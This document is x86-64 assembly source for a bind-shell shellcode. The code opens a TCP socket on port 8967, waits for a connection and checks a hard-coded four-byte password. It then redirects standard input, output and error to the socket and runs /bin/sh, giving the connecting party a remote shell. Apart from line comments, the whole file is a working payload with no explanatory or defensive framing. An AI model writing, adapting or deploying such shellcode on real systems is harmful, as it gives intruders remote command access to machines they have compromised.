        BITS 64
        global _start
        section .text

        ;; System call codes (from unistd_64.h)
        SYS_READ        equ 0x00 ;__NR_read 0
        SYS_WRITE       equ 0x01 ;__NR_write 1
        SYS_CLOSE       equ 0x03 ;__NR_close 3
        SYS_DUP2        equ 0x21 ;__NR_dup2 33
        SYS_SOCKET      equ 0x29 ;__NR_socket 41
        SYS_ACCEPT      equ 0x2b ;__NR_accept 43
        SYS_BIND        equ 0x31 ;__NR_bind 49
        SYS_LISTEN      equ 0x32 ;__NR_listen 50
        SYS_EXECVE      equ 0x3b ;__NR_execve 59
        SYS_EXIT        equ 0x3c ;__NR_exit 60

        ;; Socket constants
        AF_INET         equ 0x02
        SOCK_STREAM     equ 0x01

        ;; Shellcode constants
        PORT            equ 0x0723      ; port 8967 -> 0x2307 reversed by htons()
        PASSWORD        equ 0x38393637  ; password is port reversed (7698) in ascii

_start:

socket:
        ;; sockfd = socket(AF_INET, SOCK_STREAM, 0);
        push    SYS_SOCKET
        pop     rax
        push    AF_INET
        pop     rdi
        push    SOCK_STREAM
        pop     rsi
        xor     edx, edx
        syscall

        ;; store stock
        push    rax
        pop     rdi

setup_sockaddr:
        ;; setup sockaddr
        push    rdx                     ; rdx = 0
        push    rdx                     ; push 16 bytes (size of sockaddr_in)
        mov     byte [rsp], AF_INET     ; sockadd..sin_family = AF_INET
        mov     word [rsp+0x2], PORT    ; sockaddr.sin_port = htons(8967)
        push    rsp                     ; push &sockaddr onto stack
        pop     rsi                     ; and load it in %rsi

bind:
        ;; bind(sockfd, const struct sockaddr *addr, 16)
        push    0x10                    ; sockaddr_len = 16 bytes
        pop     rdx
        push    SYS_BIND
        pop     rax
        syscall

listen:
        ;; listen(sockfd,0)
        push    rsi                     ; store &sockaddr
        xor     esi, esi                ; backlog = 0, load from previously saved %rdx
        push    SYS_LISTEN
        pop     rax
        syscall

accept:
        ;; accept(sockfd, const struct sockaddr *addr, 16)
        pop     rsi                     ; get back &sockaddr previously stored
        push    rdx
        push    rsp
        pop     rdx
        push    SYS_ACCEPT
        pop     rax
        syscall

        ;; get back value 0x10 stored in rdx (socklen_t)
         pop     rdx

        ;; store sockfd2
        push    rax                     ; store sockfd2 to load in %rdi later

close:
        ;; close(sockfd)
        push    SYS_CLOSE
        pop     rax
        syscall

read:
        ;; read(sockfd2, void *buf, 8)
        pop     rdi                     ; load back sockfd2
        xor     eax, eax                ; rdx = 0x10, 16 bytes to read
        push    rsp                     ; rsp still points to sockaddr 16 bytes
        pop     rsi                     ; so use it as *buf
        syscall

        cmp dword [rsi], PASSWORD
        jne quit

dup2:
        ;; dup2(sockfd2, STDIN)
        ;; dup2(sockfd2, STDOUT)
        ;; dup2(sockfd2, STDERR)
        push    0x03
        pop     rsi

dup2_loop:
        dec     rsi
        push    SYS_DUP2
        pop     rax
        syscall

        jne dup2_loop

execve:
        ;; execve('//bin/sh', NULL, NULL);
        push    rsi                     ; *argv[] = 0 (NULL)
        pop     rdx                     ; *envp[] = 0 (NULL)
        push    rsi                     ; '\0' for string termination
        mov     rdi, '//bin/sh'
        push    rdi
        mov     rdi, rsp
        push    SYS_EXECVE
        pop     rax
        syscall

quit:
